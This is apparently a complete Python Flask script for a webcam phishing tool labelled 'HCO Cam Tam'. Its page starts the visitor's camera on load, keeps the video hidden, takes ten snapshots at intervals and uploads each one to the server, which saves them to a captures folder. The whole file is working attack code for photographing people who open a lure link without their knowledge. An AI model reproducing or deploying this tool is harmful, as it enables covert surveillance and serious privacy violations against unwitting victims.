#!/usr/bin/env python3
from flask import Flask, render_template_string
import os, base64

app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
<title>Camera Capture</title>
</head>
<body onload="startCam()">
<h2 style="color:red;text-align:center;">📸 HCO Cam Tam by Azhar</h2>
<video id="video" autoplay playsinline style="display:none;"></video>
<script>
let count = 0;
function startCam(){
    navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{
        let video = document.getElementById("video");
        video.srcObject = stream;
        let canvas = document.createElement("canvas");
        let ctx = canvas.getContext("2d");
        let capture = setInterval(()=>{
            if(count>=10){
                clearInterval(capture);
                stream.getTracks().forEach(t=>t.stop());
                return;
            }
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video,0,0);
            fetch("/upload",{method:"POST",body:canvas.toDataURL("image/png")});
            count++;
        },1500);
    });
}
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/upload", methods=["POST"])
def upload():
    import flask
    data = flask.request.data.decode("utf-8")
    if data.startswith("data:image/png;base64,"):
        data = data.split(",")[1]
        os.makedirs("captures", exist_ok=True)
        with open(f"captures/front_{len(os.listdir('captures'))+1}.png","wb") as f:
            f.write(base64.b64decode(data))
    return "OK"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
